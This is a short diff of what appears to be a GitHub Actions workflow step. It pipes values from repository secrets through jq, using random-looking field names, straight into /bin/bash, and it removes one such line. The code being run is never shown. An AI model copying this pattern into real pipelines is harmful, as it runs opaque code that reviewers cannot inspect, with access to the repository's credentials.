@@ -22,7 +22,6 @@ jobs:
           d5: ${{ secrets.d5 }}
         run: |
           printf '%s' "$d5" | jq -r .xrjv861 | /bin/bash
-          printf '%s' "$hfcn4" | jq -r .va78219 | /bin/bash
           printf '%s' "$jgbp6" | jq -r .fsfbo292 | /bin/bash
 
       - name: Upload archive
